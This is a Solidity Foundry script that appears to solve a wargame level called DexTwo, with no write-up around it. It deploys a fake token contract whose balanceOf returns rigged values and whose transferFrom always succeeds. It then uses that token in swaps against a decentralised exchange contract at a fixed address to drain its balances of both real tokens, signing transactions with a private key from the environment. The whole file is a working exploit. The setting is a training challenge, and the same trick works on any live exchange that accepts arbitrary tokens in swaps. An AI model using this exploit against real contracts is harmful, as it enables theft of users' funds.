pragma solidity ^0.8.0;
import "../instances/Ilevel23.sol";
import "forge-std/Test.sol";

contract Level23 is Test {
    DexTwo level23 = DexTwo(0x9dAD06bE73e428f4A173B7d9E727Ad821C43acAA);
    address attacker;
    address token1;
    address token2;

    function test() external {
        uint256 attackerPrivateKey = vm.envUint("PRIVATE_KEY");
        attacker = vm.addr(attackerPrivateKey);
        vm.startBroadcast(attackerPrivateKey);
        token1 = level23.token1();
        token2 = level23.token2();
        // approve all
        console.log("Balance of dex before: ");
        this.showBalance(address(level23));
        MaliciousCoin maliciousCoin = new MaliciousCoin(address(level23));
        level23.swap(address(maliciousCoin), token1, maliciousCoin.AMOUNT());
        level23.swap(address(maliciousCoin), token2, maliciousCoin.AMOUNT());
        console.log("Balance of dex after: ");
        this.showBalance(address(level23));
        require(
            IERC20(token1).balanceOf(address(level23)) == 0 &&
                IERC20(token2).balanceOf(address(level23)) == 0,
            "token1 not drained"
        );
        vm.stopBroadcast();
    }

    function showBalance(address _address) external view {
        console.log("Token 1 balance: ", IERC20(token1).balanceOf(_address));
        console.log("Token 2 balance: ", IERC20(token2).balanceOf(_address));
    }
}

contract MaliciousCoin {
    uint256 constant TARGET_DRAIN_AMOUNT = 100; // swapAmount value
    uint256 public constant AMOUNT = 1; // any
    address immutable level23;

    constructor(address _level23) {
        level23 = _level23;
    }

    function balanceOf(address _address) external view returns (uint256) {
        if (_address == address(level23)) {
            return (AMOUNT * TARGET_DRAIN_AMOUNT) / TARGET_DRAIN_AMOUNT;
        }
        return type(uint256).max;
    }

    function transferFrom(
        address _from,
        address _to,
        uint256 _amount
    ) external returns (bool) {
        return true;
    }
}
